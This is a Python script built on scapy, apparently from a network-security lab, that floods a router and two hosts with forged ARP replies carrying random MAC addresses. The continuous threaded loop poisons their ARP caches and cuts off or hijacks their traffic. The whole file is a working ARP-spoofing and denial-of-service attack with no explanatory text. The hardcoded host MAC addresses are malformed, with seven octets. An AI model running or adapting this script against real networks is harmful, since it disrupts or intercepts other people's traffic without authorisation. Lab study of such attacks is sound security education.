from scapy.all import ARP, Ether, Raw, send
from time import sleep
import threading
from random import randint

ROUTER_IP = "10.9.0.1"
ROUTER_MAC = "02:42:0c:27:f4:f7"

def get_mac_address():
    return "02:00:00:%02x:%02x:%02x" % (randint(0, 255), randint(0, 255), randint(0, 255))


def confuse_device(ip, hwaddr):
    ADDR = get_mac_address()
    arp_dev = ARP(op=2, psrc=ip, hwsrc=ADDR, pdst=ROUTER_IP, hwdst=ROUTER_MAC)
    ether_dev = Ether(dst=ROUTER_MAC, src=ADDR)
    send(ether_dev/arp_dev)

    ADDR2 = get_mac_address()
    arp_router = ARP(op=2, psrc=ROUTER_IP, hwsrc=ADDR2, pdst=ip, hwdst=hwaddr)
    ether_router = Ether(dst=hwaddr, src=ADDR)
    send(ether_router / arp_router)
    
def thread_cofusion(ip_addr, hw_addr):
    while 1:
        confuse_device(ip_addr, hw_addr)
        sleep(0.1)

def main():
    devs = [
        ("10.9.0.5", "aa:bb:cc:dd:ee:ff:05"), 
        ("10.9.0.6", "aa:bb:cc:dd:ee:ff:06"), 
    ]
    threads = []
    for dev_info in devs:
        thread = threading.Thread(target=thread_cofusion, args=dev_info, daemon=True)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()